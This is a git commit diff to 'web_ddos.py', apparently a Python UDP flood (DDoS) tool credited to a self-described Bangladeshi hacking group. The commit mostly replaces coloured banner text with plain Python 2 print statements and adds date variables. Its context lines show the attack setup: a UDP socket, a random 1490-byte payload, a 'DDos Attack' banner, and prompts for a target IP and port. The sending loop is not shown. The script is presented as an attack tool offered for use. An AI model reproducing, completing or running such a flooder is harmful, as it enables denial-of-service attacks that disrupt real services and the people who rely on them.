99497099404668fe2cf88037795cf89f4c625d76
Rihan Ahmed <95731297+Rihan444@users.noreply.github.com>
2022-06-14 15:08:23 +0600

    Update web_ddos.py

--- web_ddos.py
+++ web_ddos.py
@@ -3,27 +3,14 @@ import os
 import time
 import socket
 import random
-
-color_off="\033[0m"       # Text Reset
-red="\033[0;31m"          # Red
-blue="\033[0;34m"         # Blue
-yellow="\033[0;33m"       # Yellow
-biblue="\033[1;94m"       # Blue
-bipurple="\033[1;95m"     # Purple
-bicyan="\033[1;96m"       # Cyan
-bgreen="\033[1;32m"       # Green0
-on_purple="\033[45m"      # Purple
-icyan="\033[0;96m"        # Cyan
-bred="\033[1;31m"         # Red
-on_igreen="\033[0;102m"   # Green
-igreen="\033[0;92m"       # Green
-upurple="\033[4;35m"      # Purple
-biehite="\033[1;97m"      # White
-byellow="\033[1;33m"      # Yellow
-bcyan="\033[1;36m"        # Cyan
-iblue="\033[0;94m"        # Blue
-ured="\033[4;31m"         # Red
-ired="\033[0;91m"         # Red
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
 
 ##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -32,15 +19,11 @@ bytes = random._urandom(1490)
 
 os.system("clear")
 os.system("figlet DDos Attack")
-
-print(upurple+'''\n============================================================================================'''+color_off)
-
-print(bgreen+      							   '''\nCEO- 𝙱𝚊𝚗𝚐𝚕𝚊𝚍𝚎𝚜𝚑 𝙷𝚊𝚌𝚔𝚒𝚗𝚐 𝙷𝚎𝚕𝚙 𝙲𝚎𝚗𝚝𝚛𝚎    '''                                   +color_off)
-print(bred+'''                 	CEO- Dɑrk 420 Spɑmming Teɑm     '''                              +color_off)
-print(bgreen+'''                       	 Devoloped By: 𝙍𝙞𝙝𝙖𝙣 𝘼𝙝𝙢𝙚𝙙            '''                            +color_off)
-
-
-
+print
+print "Author   : Rihan Ahmed"
+print "page : Bangladesh Hacking Help Centre"
+print "group   : Bangladesh Hacking Help Centre"
+print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
